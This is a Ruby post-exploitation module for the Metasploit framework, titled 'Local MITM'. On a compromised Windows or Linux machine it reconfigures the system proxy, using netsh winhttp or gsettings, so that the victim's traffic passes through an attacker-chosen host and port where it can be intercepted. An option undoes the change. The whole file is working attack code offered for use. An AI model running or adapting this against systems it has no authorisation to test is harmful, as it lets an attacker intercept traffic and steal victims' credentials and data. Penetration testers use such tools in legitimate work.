##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Local MITM',
      'Description'   => %q{
        This module setup a local proxy on the victim computer so you can MITM it.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Eliott Teissonniere' ],
      'Platform'      => [ 'win', 'linux' ],
      'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))

    register_options(
      [
        Opt::RHOST,
        Opt::RPORT(8080),
        OptBool.new('CLEANUP', [false, 'If we should remove the proxy instead of installing it'])
      ])
  end

  def run
    if session.platform == 'windows'
      print_status('Windows detected, using netsh')

      unless datastore['CLEANUP']
        vprint_status cmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["RHOST"]}:#{datastore["RPORT"]}\" bypass-list=\"<local>\"")
      else
        vprint_status cmd_exec('netsh winhttp reset proxy')
      end
    elsif session.platform == 'linux'
      unless command_exists? 'gsettings'
        return print_error('Gsettings is not available')
      end

      print_good('Gsettings available')

      unless datastore['CLEANUP']
        vprint_status cmd_exec("gsettings set org.gnome.system.proxy mode 'manual'") # tell NetworkManager there is a proxy
        vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks port #{datastore["RPORT"]}")
        vprint_status cmd_exec("gsettings set org.gnome.system.proxy.socks host #{datastore["RHOST"]}")
        vprint_status cmd_exec("gsettings set org.gnome.system.proxy ignore-hosts \"['localhost', '127.0.0.0/8', '::1']\"")
      else
        vprint_status cmd_exec('gsettings set org.gnome.system.proxy.mode "none"')
      end
    else
      print_error('Unsupported platform')
    end
  end
end
